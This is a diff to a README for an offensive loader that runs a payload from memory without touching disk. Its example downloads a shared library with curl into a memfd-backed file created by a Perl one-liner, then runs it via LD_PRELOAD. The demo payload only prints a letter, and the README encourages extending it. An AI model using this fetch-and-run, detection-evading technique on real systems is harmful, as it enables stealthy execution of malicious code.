@@ -13,12 +13,20 @@ A bag of tricks to load a payload into memory without touching disks.
 
 ## Example
 
+Build the .so with `make`, make sure you have submodules initialized because
+this uses a patched version of nolibc to remove the C runtime and add support
+for alarm() and `sigaction().
+
+Then do something like this, starting a HTTP server from `./lib`, so load it:
 ```
 echo '$name = "egg"; $fd = syscall(319, $name, 1); $path = "/proc/" . $$ . "/fd/" . $fd; symlink($path, "/tmp/egg"); chmod 0666, $path; sleep 5; unlink "/tmp/egg"' | perl &
 sleep 0.5
 curl http://localhost:8000/libfoo.so > /tmp/egg
 LD_PRELOAD=/tmp/egg tail -f /dev/null
 ```
+
+The .so only prints the letter "h" every 5 seconds, expand it to whatever you
+want. (Phrack #68-9 for ideas, just be happy you get to write C now :))
 
 (see poc.sh for more details and ideas)
 
